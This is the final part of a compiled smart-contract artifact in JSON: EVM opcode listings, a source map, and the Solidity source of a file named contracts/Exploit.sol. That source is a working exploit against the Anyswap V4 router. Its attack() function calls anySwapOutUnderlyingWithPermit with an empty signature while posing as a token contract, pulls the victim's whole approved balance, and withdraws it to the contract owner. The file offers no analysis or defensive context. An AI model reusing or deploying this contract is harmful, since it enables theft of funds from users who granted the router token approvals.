    "1093": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1095": {
      "op": "DUP1"
    },
    "1096": {
      "op": "REVERT"
    },
    "1097": {
      "op": "JUMPDEST"
    },
    "1098": {
      "op": "POP"
    },
    "1099": {
      "op": "MLOAD"
    },
    "1100": {
      "op": "SWAP2"
    },
    "1101": {
      "op": "SWAP1"
    },
    "1102": {
      "op": "POP"
    },
    "1103": {
      "jump": "o",
      "op": "JUMP"
    },
    "1104": {
      "op": "JUMPDEST"
    },
    "1105": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1107": {
      "op": "DUP1"
    },
    "1108": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "1110": {
      "op": "DUP4"
    },
    "1111": {
      "op": "DUP6"
    },
    "1112": {
      "op": "SUB"
    },
    "1113": {
      "op": "SLT"
    },
    "1114": {
      "op": "ISZERO"
    },
    "1115": {
      "op": "PUSH2",
      "value": "0x463"
    },
    "1118": {
      "op": "JUMPI"
    },
    "1119": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1121": {
      "op": "DUP1"
    },
    "1122": {
      "op": "REVERT"
    },
    "1123": {
      "op": "JUMPDEST"
    },
    "1124": {
      "op": "DUP3"
    },
    "1125": {
      "op": "CALLDATALOAD"
    },
    "1126": {
      "op": "SWAP2"
    },
    "1127": {
      "op": "POP"
    },
    "1128": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1130": {
      "op": "DUP4"
    },
    "1131": {
      "op": "ADD"
    },
    "1132": {
      "op": "CALLDATALOAD"
    },
    "1133": {
      "op": "PUSH2",
      "value": "0x475"
    },
    "1136": {
      "op": "DUP2"
    },
    "1137": {
      "op": "PUSH2",
      "value": "0x480"
    },
    "1140": {
      "jump": "i",
      "op": "JUMP"
    },
    "1141": {
      "op": "JUMPDEST"
    },
    "1142": {
      "op": "DUP1"
    },
    "1143": {
      "op": "SWAP2"
    },
    "1144": {
      "op": "POP"
    },
    "1145": {
      "op": "POP"
    },
    "1146": {
      "op": "SWAP3"
    },
    "1147": {
      "op": "POP"
    },
    "1148": {
      "op": "SWAP3"
    },
    "1149": {
      "op": "SWAP1"
    },
    "1150": {
      "op": "POP"
    },
    "1151": {
      "jump": "o",
      "op": "JUMP"
    },
    "1152": {
      "op": "JUMPDEST"
    },
    "1153": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1155": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1157": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1159": {
      "op": "SHL"
    },
    "1160": {
      "op": "SUB"
    },
    "1161": {
      "op": "DUP2"
    },
    "1162": {
      "op": "AND"
    },
    "1163": {
      "op": "DUP2"
    },
    "1164": {
      "op": "EQ"
    },
    "1165": {
      "op": "PUSH2",
      "value": "0x1FF"
    },
    "1168": {
      "op": "JUMPI"
    },
    "1169": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1171": {
      "op": "DUP1"
    },
    "1172": {
      "op": "REVERT"
    }
  },
  "sha1": "0d8ff00850fd62527e56aaee418fa6c25546aa37",
  "source": "//SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function decimals() external view returns (uint8);\n}\ninterface AnyswapV4Router {\n    function anySwapOutUnderlyingWithPermit ( address from, address token, address to, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, uint256 toChainID ) external;\n}\n\ncontract Exploit {\n    address private owner;\n    IERC20 private token;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function underlying() public view returns (address) {\n        return address(token);\n    }\n    function burn(address from, uint256 amount) external returns (bool){\n        return true;\n    }\n    function depositVault(uint amount, address to) external returns (uint){\n        return 1;\n    }\n\n    function setUnderlying(IERC20 _token) public {\n        require(msg.sender==owner);\n        token = _token;\n    }\n\n    function withdraw() public {\n        token.transfer(owner,token.balanceOf(address(this)));\n    }\n\n    function attack(AnyswapV4Router anyswapV4Router,address from,IERC20 _token) public {\n        setUnderlying(_token);\n        anyswapV4Router.anySwapOutUnderlyingWithPermit(from,address(this),msg.sender,token.balanceOf(from), 100000000000000000000,0,bytes32(0),bytes32(0),56);\n        withdraw();\n    }\n\n}",
  "sourceMap": "505:951:0:-:0;;;582:49;;;;;;;;;-1:-1:-1;606:5:0;:18;;-1:-1:-1;;;;;;606:18:0;614:10;606:18;;;505:951;;;;;;",
  "sourcePath": "contracts/Exploit.sol",
  "type": "contract"
}